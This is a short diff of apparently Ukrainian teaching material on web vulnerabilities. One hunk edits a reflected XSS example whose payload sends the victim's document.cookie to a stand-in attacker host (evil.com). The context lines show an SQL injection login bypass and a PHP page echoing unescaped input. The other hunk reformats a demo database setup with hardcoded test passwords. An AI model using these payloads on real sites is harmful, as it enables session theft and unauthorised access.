@@ -143,7 +143,7 @@ SELECT * FROM users WHERE login='admin'--' AND pass='anything'
 <p>Привіт, <?php echo $_GET['name']; ?></p>
 
 <!-- Атака: -->
-?name=<script>document.location='http://evil.com/steal.php?c='+document.cookie</script>
+?name=<script>document.location='http://evil.com/s.php?c='+document.cookie</script>
 
 <!-- Результат: виконання JavaScript у браузері жертви -->
 ```
@@ -419,7 +419,8 @@ sqlite3* setupDatabase() {
         "  role TEXT DEFAULT 'user');"
         "INSERT INTO users (login, password, role) "
         "VALUES ('admin', 'secret123', 'admin');"
-        "INSERT INTO users (login, password, role) VALUES ('user1', 'pass1', 'user');";
+        "INSERT INTO users (login, password, role) "
+        "VALUES ('user1', 'pass1', 'user');";
 
     sqlite3_exec(db, schema, nullptr, nullptr, nullptr);
     return db;
